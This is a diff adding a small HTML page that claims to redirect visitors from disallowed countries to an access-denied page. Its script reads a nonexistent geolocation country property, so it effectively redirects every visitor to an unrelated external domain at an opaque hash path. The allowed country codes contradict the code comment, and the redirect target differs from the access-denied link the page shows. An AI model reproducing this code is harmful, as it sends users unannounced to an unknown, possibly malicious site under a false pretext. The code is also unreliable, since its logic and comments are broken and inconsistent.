@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      var country = navigator.geolocation.countryCode; // Get the user's country code
+      if(country !== 'De' && country !== 'ai' && country !== 'MX') {
+        window.location.href = "https://quaighpaint.com/0/0/0/b66664e111be6f6f1d547d09ebb8e30f"; // Redirect to access-denied page if the country is not US, CA or MX
+      }
+    </script>
+    <title>Redirecting...</title>
+  </head>
+  <body>
+    <p>You will be redirected to <a href="https://www.example.com/access-denied.html">access-denied page</a> if you are not from the allowed countries.</p>
+  </body>
+</html>
